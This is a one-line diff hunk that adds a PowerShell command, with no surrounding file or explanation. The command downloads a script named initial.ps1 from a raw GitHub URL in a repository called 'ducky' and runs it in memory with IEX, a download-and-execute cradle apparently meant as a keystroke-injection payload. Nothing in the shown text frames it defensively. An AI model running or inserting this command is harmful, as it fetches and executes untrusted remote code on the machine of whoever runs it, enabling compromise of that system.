@@ -1,0 +1,1 @@
+IEX(IWR https://raw.githubusercontent.com/Gamoboy/ducky/master/initial.ps1 -UseBasicParsing)
